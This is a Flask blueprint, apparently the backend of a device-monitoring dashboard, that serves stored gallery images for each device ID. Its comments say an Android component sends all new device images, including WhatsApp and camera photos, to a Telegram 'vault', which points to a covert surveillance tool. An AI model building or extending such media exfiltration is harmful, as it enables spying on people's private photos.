import os
from flask import Blueprint, request, jsonify
from database import supabase

gallery_bp = Blueprint('gallery', __name__)

# =========================================================================
# 🚀 1. UPLOAD PIPELINE DESTROYED (Zero Server Load Architecture)
# =========================================================================
# The /api/gallery/upload endpoint has been completely obliterated.
# Android's MediaSyncEngine now pipes all newly indexed device images (WhatsApp, Camera, etc.)
# directly to the Telegram API. 
# Render Server CPU Usage: 0% | Supabase Storage Usage: 0%

# =========================================================================
# 🚀 2. DASHBOARD API: GET GALLERY MEDIA (Legacy / UI Fallback)
# =========================================================================
@gallery_bp.route('/api/devices/<device_id>/gallery', methods=['GET'])
def get_device_gallery(device_id):
    """
    Dashboard UI (gallery.html) is route ko call karta hai grid load karne ke liye.
    Isko zinda rakha hai taaki frontend par 404 Error crash na aaye aur purani images dikh sakein.
    Nayi saari media ab strictly Telegram Vault me jayegi.
    """
    try:
        # Fetching legacy records if any exist in the database.
        query = supabase.table('gallery').select('*').eq('device_id', device_id).order('created_at', desc=True).execute()
        return jsonify({"status": "success", "data": query.data}), 200
    except Exception as e:
        print(f"[GALLERY CRASH] Fetch anomaly: {str(e)}", flush=True)
        return jsonify({"status": "error", "message": "Database read failed."}), 500
